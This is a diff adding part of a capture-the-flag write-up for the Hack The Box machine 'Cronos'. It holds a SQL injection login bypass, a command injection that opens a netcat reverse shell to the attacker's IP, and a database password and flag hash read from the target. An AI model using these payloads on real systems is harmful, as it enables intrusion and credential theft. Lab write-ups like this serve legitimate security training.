@@ -39,3 +39,35 @@ cronos.htb.		604800	IN	SOA	cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 
 I decide to add cronos.htb to the /etc/hosts and now visiting cronos.htb resolves and am presented with a website.
 There is nothing interesting on the main website. I therefor proceed to test http://ns1.cronos.htb/; http://www.cronos.htb/ and http://admin.cronos.htb/
 The first two have nothing interesting but the last one has a login page.
+I attempt simple SQL injection for the username admin'-- - and any pass and this works.
+We are presented with a nettool which can run few commands like ping and traceroute.
+Chaining this with more commands I realize it might be possible to do command execution here.
+I can read many files including the user file but I decide to get the reverse shell first.
+And so I run:
+ping 8.8.8.8; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.14 4444 >/tmp/f
+And the user flag is pawned!
+$ whoami
+www-data
+$ which python
+/usr/bin/python
+$ python -c 'import pty; pty.spawn("/bin/bash")'
+www-data@cronos:/var/www/admin$ ls  
+ls
+config.php  index.php  logout.php  session.php	welcome.php
+www-data@cronos:/var/www/admin$ cat config.php
+cat config.php
+<?php
+   define('DB_SERVER', 'localhost');
+   define('DB_USERNAME', 'admin');
+   define('DB_PASSWORD', 'kEjdbRigfBHUREiNSDs');
+   define('DB_DATABASE', 'admin');
+   $db = mysqli_connect(DB_SERVER,DB_USERNAME,DB_PASSWORD,DB_DATABASE);
+?>
+www-data@cronos:/var/www/admin$ cat /home/noulis/user.txt
+cat /home/noulis/user.txt
+51d236438b333970dbba7dc3089be33b
+=================Priv Escalation=====================
+www-data@cronos:/var/www/admin$ mysql -u admin -p 
+mysql -u admin -p 
+Enter password: kEjdbRigfBHUREiNSDs
+Login into mysql database I get a hash for the admin but that does not seem to lead anywhere. So i decide to run a script to check privileges.
